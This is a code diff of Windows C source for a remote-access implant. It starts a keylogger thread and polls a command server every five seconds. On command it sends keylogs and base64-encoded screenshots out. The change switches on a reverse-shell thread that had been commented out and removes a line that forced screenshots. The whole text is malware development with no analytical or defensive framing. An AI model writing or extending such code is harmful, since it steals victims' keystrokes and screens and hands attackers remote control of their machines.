@@ -102,14 +102,14 @@ VOID SendScreenshot()
     HANDLE hFile;
     if ((hFile = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
         return;
-
+        
     LARGE_INTEGER fileSize;
     if (!GetFileSizeEx(hFile, &fileSize))
     {
         CloseHandle(hFile);
         return;
     }
-
+    
     LPBYTE fileContent = NULL;
     if ((fileContent = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (fileSize.LowPart + 1) * sizeof(BYTE))) == NULL)
     {
@@ -186,7 +186,8 @@ VOID SendScreenshot()
     cJSON_Delete(object);
 
     HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, base64string);
-
+    
+    CloseHandle(hFile);
     DeleteFile(path);
 }
 /********************************************************************************************************************************************************/
@@ -196,7 +197,8 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
 
     //Thread de polling
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadKeylogger, NULL, 0, NULL);
-
+    
+    
     while (TRUE)
     {
         printf("Sending client informations\n");
@@ -207,11 +209,8 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
         printf("Polling for new commands ...\n");
         Commands commands = GetCommands(SERVER_NAME_A, HTTPS_PORT);
 
-        commands.screenshot = TRUE;
-
         if (commands.keylogs)
         {
-
             printf("Sending keylogs ...\n");
             SendKeylogs();
         }
@@ -223,10 +222,9 @@ INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, 
         if (commands.reverseShell)
         {
             printf("Opening reverse shell ...\n");
-            //Create Thread with Samuel's program
 
             //Thread de Reverse Shell
-            //HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadReverseShell, NULL, 0, NULL);
+            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReversShell, NULL, 0, NULL);
         }
 
         Sleep(5000);
